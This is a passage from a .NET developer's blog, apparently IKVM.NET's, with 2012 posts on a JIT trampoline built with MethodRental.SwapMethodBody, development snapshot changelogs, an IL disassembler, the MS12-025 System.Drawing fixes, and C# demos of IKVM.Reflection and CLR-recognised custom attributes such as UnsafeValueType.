</PRE></TD></TR></TBODY></TABLE>
<P>The jmp instruction is interesting, it transfers control to a method that takes the same arguments as the current method and passes the current argument values. Here it is used to jump to a new version the same method, where the method body has been replaced with the actual CIL code.</P>
<P>The native code that is generated for the trampoline is:</P>
<TABLE>
<TBODY>
<TR>
<TH>&nbsp;</TH>
<TH>x86</TH>
<TH></TH>
<TH>x64</TH></TR>
<TR>
<TD width=40>&nbsp;</TD>
<TD><PRE>push   ebp 
mov    ebp,esp 
sub    esp,8 
xor    eax,eax 
mov    dword ptr [ebp-8],eax 
mov    dword ptr [ebp-4],ecx 
lea    ecx,[ebp-8] 
mov    edx,6231A0h 
call   680065F0 
lea    eax,[ebp-8] 
push   dword ptr [eax] 
call   FFE39B70 
mov    ecx,dword ptr [ebp-4] 
mov    esp,ebp 
pop    ebp 
jmp    dword ptr ds:[006231A8h] 
</PRE></TD>
<TD width=40>&nbsp;</TD>
<TD><PRE>push   rbx 
sub    rsp,20h 
mov    ebx,ecx 
lea    rcx,[00257330h] 
call   FFFFFFFFF35036D0 
mov    rcx,rax 
call   00000000001C84C0 
mov    ecx,ebx 
lea    rax,[00247D80h] 
add    rsp,20h 
pop    rbx 
jmp    rax
<FONT color=gray>add    rsp,20h 
pop    rbx 
ret</FONT>
</PRE></TD></TR></TBODY></TABLE>
<P>(Note that the x64 JIT generates three unreachable instructions at the end. Shown in gray.)</P>
<P>When this code is invoked, it loads the method handle and calls the Program.JIT method. After that returns, it invokes the new method body that the JIT method installed using MethodRental.SwapMethodBody.</P>
<P>When run on the CLR* this all appears to work as you'd hope, but unfortunately that's no guarantee that it will work in the real world. Googling (and experience) suggests that there aren't many** users of MethodRental.SwapMethodBody, so it is quite possible that there are some showstoppers lurking somewhere.</P>
<P>* It does not work on Mono at the moment.<BR>** I found one reference to it in a <A href="http://hv.diva-portal.org/smash/get/diva2:215124/FULLTEXT01">paper</A> on RubySharp from 2004.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/11/2012 12:24:32 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=977499e8-0a70-4744-9482-5b6132504055"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=977499e8-0a70-4744-9482-5b6132504055">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 04 May 2012</h2></div>
<div class="newsItems"><a name="a9aae28e9-ab18-48b7-83c5-31e15a3d69f2"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>This should hopefully be the last snapshot based on OpenJDK 7 FCS as 7u4 has shipped and the bundle should be available soon. After that I'll start work on integrating 7u4 and working towards the IKVM 7.1 release.</P>
<P>Changes:</P>
<UL>
<LI>Bug fix. When adding certificates to virtual cacerts file make sure that the aliases that are generated from the certificate subject are unique.</LI>
<LI>Bug fix. If a class file UTF-8 string ends with an incomplete multi byte char, we should throw the appropriate exception.</LI>
<LI>IKVM.Reflection: Added ModuleBuilder.__GetAssemblyToken() API.</LI>
<LI>IKVM.Reflection: Removed Mono CryptoConvert code and use .NET 2.0 API instead.</LI>
<LI>IKVM.Reflection: Rewrote StrongNameKeyPair to remove dependency on System.Reflection.StrongNameKeyPair.</LI>
<LI>IKVM.Reflection: Improved assembly title and description.</LI>
<LI>IKVM.Reflection: Metadata is now sorted with a stable sort algorithm.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4507.zip">ikvmbin-7.1.4507.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/04/2012 08:58:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9aae28e9-ab18-48b7-83c5-31e15a3d69f2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9aae28e9-ab18-48b7-83c5-31e15a3d69f2">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 23 April 2012</h2></div>
<div class="newsItems"><a name="a5ec2c949-aeec-4d05-bd54-bd12a2c3a7ca"></a><div class="entry">
	<h3 class="entryTitle">IKDASM - IL Disassembler Example for IKVM.Reflection</h3>
	<div class="entryBody">
		<P>A while ago I wrote an IL disassembler to test IKVM.Reflection. Both as a correctness test and also to test if the API surface exposes enough of the underlying information.</P>
<P>I thought it would make a good IKVM.Reflection example (although the code won't win any awards, it's a bit of a hack). One nice feature is that it tries really hard to emit the same output file as the .NET ildasm to make comparison easier. There's even a command line option to match a specific ildasm version (2.0, 4.0 or 4.5) and its quirks.</P>
<P>The binaries are available in <A href="http://www.frijters.net/ikdasm-v0.1-binaries.zip">ikdasm-v0.1-binaries.zip</A> and the Visual Studio 2010 solution in <A href="http://www.frijters.net/ikdasm-v0.1.zip">ikdasm-v0.1.zip</A>.</P>
<P>Note that in its current form the ildasm compatibility mode&nbsp;only works on Windows, because it needs to P/Invoke <A href="http://msdn.microsoft.com/en-us/library/26cdxcyz(v=vs.100).aspx">_gcvt</A> in msvcrt.dll to make sure the floating point numbers match the ildasm output.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/23/2012 16:54:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5ec2c949-aeec-4d05-bd54-bd12a2c3a7ca"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5ec2c949-aeec-4d05-bd54-bd12a2c3a7ca">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 19 April 2012</h2></div>
<div class="newsItems"><a name="a8ab3842a-c399-4a4d-928e-98e6f19b3056"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>At Lang.NEXT I met someone who was interested in using IKVM.Reflection and after he started porting his code, he ran into some missing functionality in IKVM.Reflection, so I've made some improvements there.</P>
<P>I've also fixed the remaining known issues with access stubs and "unloadable" (missing types) custom modifiers.</P>
<P>Changes:</P>
<UL>
<LI>Fix for recently introduced bug (with access stub rewrite). Bug #<A href="http://sourceforge.net/tracker/?func=detail&amp;aid=3512589&amp;group_id=69637&amp;atid=525264">3512589</A>.</LI>
<LI>Changed build process to fall back to the NAnt <RC />task, if we can't find the resource compiler.</LI>
<LI>Made WinForms message loop thread creation lazy to hopefully allow more applications to run without message loop thread. This is a (partial) workaround for bug #<A href="http://sourceforge.net/tracker/?func=detail&amp;aid=3515033&amp;group_id=69637&amp;atid=525264">3515033</A>.</LI>
<LI>Changed ikvmc to read input files after processing all the options (to make -nowarn: and -warnaserror: options that follow the file names work for warnings produced during input file reading).</LI>
<LI>Added support for type 2 access stubs for constructors.</LI>
<LI>Bug fix. When an unloadable type is used in a method signature that overrides a method (or implements an interface method), the custom modifier must be the same as the base class or an override stub must be generated.</LI>
<LI>Added partial implementation of ThreadMXBean.</LI>
<LI>IKVM.Reflection: Bug fix. When writing an assembly that has a .netmodule, the TypeDefId field in the ExportedType in the manifest module should contain a TypeDef token instead of an index.</LI>
<LI>IKVM.Reflection: Bug fix. When exporting a nested type (via AssemblyBuilder.__AddTypeForwarder()), we should also set the namespace (in practice it is unlikely for a nested type to have a namespace, but is is possible).</LI>
<LI>IKVM.Reflection: Corrected a couple of method parameter names in Assembly.</LI>
<LI>IKVM.Reflection: Added Assembly.GetType(string,bool,bool) method.</LI>
<LI>IKVM.Reflection: Added support for case-insensitive type and member lookup.</LI>
<LI>IKVM.Reflection: Implemented case insensitive lookup in Type.GetInterface().</LI>
<LI>IKVM.Reflection: Moved GetEvents(), GetFields(), GetConstructors(), GetNestedTypes() and GetProperties() to a common implementation that fixes a number of bugs.</LI>
<LI>IKVM.Reflection: Fixed GetMethods() to properly filter out base class methods that have been overridden.</LI>
<LI>IKVM.Reflection: Moved member lookup by name to a common implementation that fixes a number of bugs and adds IgnoreCase support.</LI>
<LI>IKVM.Reflection: Added MemberInfo.ReflectedType.</LI>
<LI>IKVM.Reflection: Added Binder support for method and property lookup.</LI>
<LI>IKVM.Reflection: Bug fix. ParameterBuilder.Position should return the 1-based position passed in to DefineParameter, not the 0-based ParameterInfo.Position.</LI>
<LI>IKVM.Reflection: Changed Type.__ContainsMissingType to return true for generic type parameters that have constraints that return true for __ContainsMissingType.</LI>
<LI>IKVM.Reflection: Bug fix. It should be possible to import a function pointer type into a ModuleBuilder.</LI>
<LI>IKVM.Reflection: Implemented Assembly.ToString().</LI>
<LI>IKVM.Reflection: Added [Flags] attribute to ResourceLocation enum.</LI>
<LI>IKVM.Reflection: Added support for reading/querying manifest resources that are forwarded to another assembly.</LI>
<LI>IKVM.Reflection: Bug fix. Module.GetManifestResourceStream() should return null (instead of throwing FileNotFoundException) for non-existing resource names.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4491.zip">ikvmbin-7.1.4491.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/19/2012 09:26:43 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8ab3842a-c399-4a4d-928e-98e6f19b3056"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8ab3842a-c399-4a4d-928e-98e6f19b3056">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 12 April 2012</h2></div>
<div class="newsItems"><a name="ab3525cd1-8788-4d6d-b299-4722ddebad94"></a><div class="entry">
	<h3 class="entryTitle">MS12-025</h3>
	<div class="entryBody">
		<P>This patch Tuesday Microsoft released <A href="http://technet.microsoft.com/en-us/security/bulletin/ms12-025">MS12-025</A> that fixes approximately a zillion vulnerabilities in System.Drawing.dll.</P>
<P>Here's what they fixed (multiple instances of each issue):</P>
<UL>
<LI>Added security demands to unsafe methods.</LI>
<LI>Wrap handles in <A href="http://msdn.microsoft.com/en-us/library/System.Runtime.InteropServices.SafeHandle.aspx">SafeHandle</A> instead of using IntPtr.</LI>
<LI>Use <A href="http://msdn.microsoft.com/en-us/library/74b4xzyw.aspx">checked</A> to guard against integer overflow when calculating how many bytes to <A href="http://msdn.microsoft.com/en-us/library/s69bkh17.aspx">AllocHGlobal</A>.</LI></UL>
<P>It's a little embarassing to have so many vulnerabilities in this old code. Luckily, silently running .NET code in the browser is becoming a <A href="http://blogs.technet.com/b/srd/archive/2012/04/10/ms12-025-and-xbap-no-longer-a-driveby-threat.aspx">thing of the past</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/12/2012 12:33:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b3525cd1-8788-4d6d-b299-4722ddebad94"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b3525cd1-8788-4d6d-b299-4722ddebad94">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 06 April 2012</h2></div>
<div class="newsItems"><a name="affe4e8ed-26cb-4511-880b-198b2f3a4540"></a><div class="entry">
	<h3 class="entryTitle">Lang.NEXT</h3>
	<div class="entryBody">
		<P>I'm back home after a really&nbsp;great <A href="http://channel9.msdn.com/Events/Lang-NEXT/Lang-NEXT-2012">Lang.NEXT</A> conference.</P>
<P>The video of my talk is available on <A href="http://channel9.msdn.com/Events/Lang-NEXT/Lang-NEXT-2012/IKVM-NET-Building-a-Java-VM-on-the-NET-Framework">Channel 9</A>. The slides are <A href="http://www.frijters.net/IKVM%20-%20Lang.NEXT.pdf">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/06/2012 22:24:37 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ffe4e8ed-26cb-4511-880b-198b2f3a4540"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ffe4e8ed-26cb-4511-880b-198b2f3a4540">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 26 March 2012</h2></div>
<div class="newsItems"><a name="ad5ef57bf-e089-43fe-afff-bd094094d6e0"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Enough changes to warrant a new development snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Fixes and improvements to Windows version of JFileChooser.</LI>
<LI>Bug fix. When writing a direct ByteBuffer to a non-blocking socket and the write fails because there is no kernel buffer available, we should not advance the ByteBuffer position.</LI>
<LI>Bug fix. Non-public property getter/setter methods should be ignored when we create properties to hide properties inherited from shadow types. This fixes a build break with .NET 4.5 beta which introduces a protected setter for Exception.HResult.</LI>
<LI>Bug fix. Custom attribute properties that don't have a public getter and setter should not be exposed as annotation properties.</LI>
<LI>Added ikvmc -win32manifest:<FILE> option.</LI>
<LI>Added ikvmc -filealign:<N> option.</LI>
<LI>Added ikvmc -highentropyva option (to enable high entropy ASLR in 64 bit processes on Windows 8).</LI>
<LI>Added support for custom paper format to Win32 print service.</LI>
<LI>Changed ikvmstub to create a missing assembly when a dependency is not found and only complain about it when it is actually needed.</LI>
<LI>Added explicit -help and -? options to ikvmc.</LI>
<LI>Added ikvmc -nologo option.</LI>
<LI>Changed ikvmc to print copyright when compiling (unless -nolog is specified).</LI>
<LI>Cleaned up to ikvmc help message.</LI>
<LI>Lots of ikvmc error handling clean up. All errors now have an IKVMCnnnn error code.</LI>
<LI>Added support to ikvmc to automatically set the full source path in the debugging info if the source file lives next to the .class file.</LI>
<LI>Improved BufferedImage.setRGB().</LI>
<LI>IKVM.Reflection: Added AssemblyBuilder.__DefineManifestResource() API to add a Win32 manifest resource.</LI>
<LI>IKVM.Reflection: Various win32 resource related methods on AssemblyBuilder now throw ArgumentException if a conflicting resource has already been defined.</LI>
<LI>IKVM.Reflection: Marked ModuleBuilder.__SetStackReserve() obsolete and made ModuleBuilder.__StackReserve property writeable to be consistent with __ImageBase property.</LI>
<LI>IKVM.Reflection: New API. Made ModuleBuilder.__FileAlignment writeable.</LI>
<LI>IKVM.Reflection: New API. Added Module.__DllCharacteristics and ModuleBuilder.__DllCharacteristics properties to get and set image DLL characteristics flags.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4468.zip">ikvmbin-7.1.4468.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/26/2012 08:53:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d5ef57bf-e089-43fe-afff-bd094094d6e0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d5ef57bf-e089-43fe-afff-bd094094d6e0">Comments [10]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 16 March 2012</h2></div>
<div class="newsItems"><a name="ad28a08bf-0476-41be-a923-60842fdaf8b0"></a><div class="entry">
	<h3 class="entryTitle">IKVM.Reflection: Inspecting an Assembly Without Loading Dependencies</h3>
	<div class="entryBody">
		<P>One of the advantages of IKVM.Reflection over System.Reflection is that it is much easier to load an assembly without having to load its dependencies. This functionality is used by Mono's C# compiler to load referenced assemblies without having to (potentially) load the transitive closure of dependencies of those assemblies.</P>
<P>Here's a simple example that loads an assembly and prints its types and members:</P>
<P><CODE>using System;<BR>using IKVM.Reflection;<BR><BR>class Program {<BR>&nbsp; const BindingFlags AllDeclared =<BR>&nbsp;&nbsp;&nbsp; BindingFlags.Public |<BR>&nbsp;&nbsp;&nbsp; BindingFlags.NonPublic |<BR>&nbsp;&nbsp;&nbsp; BindingFlags.Instance |<BR>&nbsp;&nbsp;&nbsp; BindingFlags.Static |<BR>&nbsp;&nbsp;&nbsp; BindingFlags.DeclaredOnly;<BR><BR>&nbsp; static void Main(string[] args) {<BR>&nbsp;&nbsp;&nbsp; var universe = new Universe();<BR>&nbsp;&nbsp;&nbsp; universe.AssemblyResolve += AssemblyResolve;<BR>&nbsp;&nbsp;&nbsp; var assembly = universe.LoadFile(args[0]);<BR>&nbsp;&nbsp;&nbsp; foreach (var type in assembly.GetTypes()) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(type.FullName);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteMembers(type.GetFields(AllDeclared));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteMembers(type.GetProperties(AllDeclared));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteMembers(type.GetEvents(AllDeclared));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteMembers(type.GetConstructors(AllDeclared));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WriteMembers(type.GetMethods(AllDeclared));<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR><BR>&nbsp; static void WriteMembers(MemberInfo[] members) {<BR>&nbsp;&nbsp;&nbsp; foreach (var member in members)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(" {0}", member);<BR>&nbsp; }<BR><BR>&nbsp; static Assembly AssemblyResolve(object sender, IKVM.Reflection.ResolveEventArgs args) {<BR>&nbsp;&nbsp;&nbsp; return ((Universe)sender).CreateMissingAssembly(args.Name);<BR>&nbsp; }<BR>}</CODE></P>
<P>When you don't handle the Universe.AssemblyResolve event (or non of the handlers return an assembly), IKVM.Reflection will fall back to using System.Reflection.Assembly.ReflectionOnlyLoad() and then use the Location property of the returned assembly and load the assembly from there.</P>
<P>If you do handle the Universe.AssemblyResolve event, you can either find the assembly somewhere and load it, or use Universe.CreateMissingAssembly() to create a placeholder Assembly that will automatically resolve all types and members that it is expected to contain (based on references from loaded assemblies that are inspected).</P>
<P>When you're reflecting over the members you can encounter types and members from the missing assemblies and you should be prepared to handle these because many operations are not allowed on them (since there is no type or member definition, a lot of information simply isn't available). You can detect these missing types or members by looking at the <CODE>MemberInfo.__IsMissing</CODE> property.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/16/2012 13:26:07 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d28a08bf-0476-41be-a923-60842fdaf8b0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d28a08bf-0476-41be-a923-60842fdaf8b0">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 15 March 2012</h2></div>
<div class="newsItems"><a name="a6c3ae56d-7b22-40ae-96b6-ba9ce7a6b6d3"></a><div class="entry">
	<h3 class="entryTitle">Lesser Known CLR Custom Attributes -- UnsafeValueType</h3>
	<div class="entryBody">
		<P>In a comment to the previous post about <A href="/CommentView.aspx?guid=f8945e35-6f5e-4a0c-bd4b-c7c88fba4656">CLR Custom Attributes</A> I listed some other custom attributes that the&nbsp;CLR recognizes (by name). Some of them I previously thought were compiler only custom attributes, so I decided to investigate them.</P>
<P><STRONG>System.Runtime.CompilerServices.UnsafeValueTypeAttribute</STRONG></P>
<P>The <A href="http://msdn.microsoft.com/en-us/library/system.runtime.compilerservices.unsafevaluetypeattribute.aspx">documentation</A> for this attribute, somewhat uncharacteristically, actually explains what it does, but I decided to try it out.</P>
<P>Here's an example that demonstrates what it does:</P>
<P><CODE>using System;<BR>using System.Runtime.CompilerServices;<BR><BR>//[UnsafeValueType]<BR>struct Foo {<BR>&nbsp; public int field;<BR>}<BR><BR>class Program {<BR>&nbsp; [MethodImpl(MethodImplOptions.NoOptimization)]<BR>&nbsp; static void Main() {<BR>&nbsp;&nbsp;&nbsp; int i = 1234;<BR>&nbsp;&nbsp;&nbsp; Foo foo = new Foo();<BR>&nbsp;&nbsp;&nbsp; Corrupt(ref foo, ref i);<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(i);<BR>&nbsp; }<BR><BR>&nbsp; [MethodImpl(MethodImplOptions.NoInlining)]<BR>&nbsp; unsafe static void Corrupt(ref Foo foo, ref int unused) {<BR>&nbsp;&nbsp;&nbsp; fixed (int* p = &amp;foo.field) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(long*)p = 4567L &lt;&lt; 32;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>} </CODE></P>
<P>When you run this it prints out 4567&nbsp;and terminates successfully. However, when you uncomment the <CODE>//[UnsafeValueType]</CODE> line and then run it again, you'll see that it prints out 1234 and crashes and if you attach a debugger you see that it crashes with error code <A href="http://msdn.microsoft.com/en-us/magazine/cc163311.aspx">STATUS_STACK_BUFFER_OVERRUN</A> because the CLR inserted a <A href="http://en.wikipedia.org/wiki/Stack-smashing_protection">canary</A> on the stack after the unsafe value type.</P>
<P>As the documentation indicates, both the C++ and C# compiler use this attribute. The C++ compiler uses it to implement /GS for managed code and the C# compiler automatically applies it to the value types that it creates to represent <A href="http://msdn.microsoft.com/en-us/library/zycewsya.aspx">fixed size buffers</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/15/2012 09:42:27 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6c3ae56d-7b22-40ae-96b6-ba9ce7a6b6d3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6c3ae56d-7b22-40ae-96b6-ba9ce7a6b6d3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 12 March 2012</h2></div>
<div class="newsItems"><a name="ab655ecfe-959d-4ec4-9cd1-57ec7fa3b614"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>It's been a while since I&nbsp;released a development snapshot. Volker fixed several AWT issues and I've been doing mostly IKVM.Reflection work.</P>
<P>Changes:</P>
<UL>
<LI>Prevent IKVMC0109 warning when a stub is encountered after the corresponding type has already been loaded.</LI>
<LI>Bug fix. The $Method inner class for delegates should also be loadable for generic delegates. Thanks to Michael Bayne for reporting this.</LI>
<LI>Add dummy splashscreen native library to VFS. Fix for #<A href="https://sourceforge.net/tracker/?func=detail&amp;aid=3480917&amp;group_id=69637&amp;atid=525264">3480917</A>.</LI>
<LI>Fix a bug with a ToolkitImage as frame icon.</LI>
<LI>Fix the native file dialog, it was created in the wrong thread and the method blockWindows(List) was not implemented</LI>
<LI>Synchronized the BufferedImage bitmap to fix "System.InvalidOperationException: The object is currently in use elsewhere." if the BufferedImage is used from multiple threads (as is valid in Java).</LI>
<LI>Workaround a problem in sun.util.locale.LocaleObjectCache that assumes that a SoftReference is always immediately enqueued when get() returns null. Now we actively enqueue the reference in get() when the reference was cleared by the GC (instead of waiting for the QueueWatcher to eventually enqueue the reference from the finalizer).</LI>
<LI>Merged security changes to AtomicReferenceArray.</LI>
<LI>Intrinsified the unsafe.objectFieldOffset(XXX.class.getDeclaredField("xxx")) pattern to avoid expensive reflection field lookup in static initializers of common OpenJDK classes.</LI>
<LI>Override Toolkit.areExtraMouseButtonsEnabled() to avoid infinite recursion.</LI>
<LI>Fix a deadlock for TooltipImages which complete with a ImageObserver.FRAMEBITS instead with ImageObserver.ALLBITS. The problem occur with JDownloader.</LI>
<LI>Replace all RasterOp with the versions from GNU Classpath because the original use native code that was not ported and didn't work.</LI>
<LI>Fixed a NullReferenceException in ConvertRegion.</LI>
<LI>Added support for window with transparent background.</LI>
<LI>Added support for undecorated Frame and Dialog.</LI>
<LI>Fixed IPv6 address bug. When the scope ID is zero we should pass -1 to the Inet6Address constructor (this will cause its scope_id to remain 0 and scope_id_set to remain false).</LI>
<LI>Added <A href="http://tountas-software.blogspot.com/2012/03/c-actors-with-akka-20-via-ikvm-net.html">Unsafe methods used by Akka</A>.</LI>
<LI>Avoid linking class constant pool entries that aren't used (or are only used by name). This avoids spurious IKVMC0100 warnings and unnecessary class load attempts.</LI>
<LI>IKVM.Reflection: Performance tweak to AssemblyName.FullName. Inspired by Marek Safar.</LI>
<LI>IKVM.Reflection: TypeNameParser.Escape() performance tweak by Marek Safar.</LI>
<LI>IKVM.Reflection: Added UniverseOptions.DisableFusion to explicitly disable Fusion (without having to resort to setting the IKVM_DISABLE_FUSION environment variable).</LI>
<LI>IKVM.Reflection: Optimized assembly lookup. Thanks to Marek Safar for the pointer.</LI>
<LI>IKVM.Reflection: Cache the assembly FullName in Assembly. This brings the Assembly.FullName property performance more inline with System.Reflection which also caches the FullName (computing the FullName is expensive).</LI>
<LI>IKVM.Reflection: Use binary search for sorted metadata table lookups.</LI>
<LI>IKVM.Reflection: Added new API MethodInfo.__GetMethodImpls() to efficiently get the MethodImpls for a specific method.</LI>
<LI>IKVM.Reflection: Bug fix. TypeDefImpl.__GetMethodImplMap() should populate typeArgs before using it.</LI>
<LI>IKVM.Reflection: Added RawModule.ModuleVersionId property.</LI>
<LI>IKVM.Reflection: Support building an "mscorlib" assembly that is not named mscorlib.</LI>
<LI>IKVM.Reflection: Added Type.__CreateMissingProperty() API to enable symbolic properties in custom attributes.</LI>
<LI>IKVM.Reflection: Added Universe.MissingTypeIsValueType event to enable missing types (i.e. symbolic types) to be used in signatures.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4454.zip">ikvmbin-7.1.4454.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/12/2012 10:50:41 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b655ecfe-959d-4ec4-9cd1-57ec7fa3b614"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b655ecfe-959d-4ec4-9cd1-57ec7fa3b614">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 08 March 2012</h2></div>
<div class="newsItems"><a name="af8945e35-6f5e-4a0c-bd4b-c7c88fba4656"></a><div class="entry">
	<h3 class="entryTitle">CLR Supported Custom Attributes</h3>
	<div class="entryBody">
		<P>After working with the CLR for more than a decade, once in a while I still&nbsp;run into&nbsp;surprising behavior.</P>
<P>It turns out that the (non pseudo-) custom attributes that CLR recognizes are only matched by name, not assembly.</P>
<P>So you can do this for example:</P>
<P><CODE>using System;<BR>using System.Threading;<BR><BR>namespace System {<BR>&nbsp; class ThreadStaticAttribute : global::System.Attribute { }<BR>}<BR><BR>class Program {<BR>&nbsp; [System.ThreadStaticAttribute]<BR>&nbsp; static int foo;<BR><BR>&nbsp; public static void Main() {<BR>&nbsp;&nbsp;&nbsp; WriteFoo();<BR>&nbsp;&nbsp;&nbsp; foo = 42;<BR>&nbsp;&nbsp;&nbsp; WriteFoo();<BR>&nbsp;&nbsp;&nbsp; new Thread(WriteFoo).Start();<BR>&nbsp; }<BR><BR>&nbsp; static void WriteFoo() {<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(foo);<BR>&nbsp; }<BR>}</CODE></P>
<P>On the CLR the foo static variable is a thread local, but on Mono it isn't.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
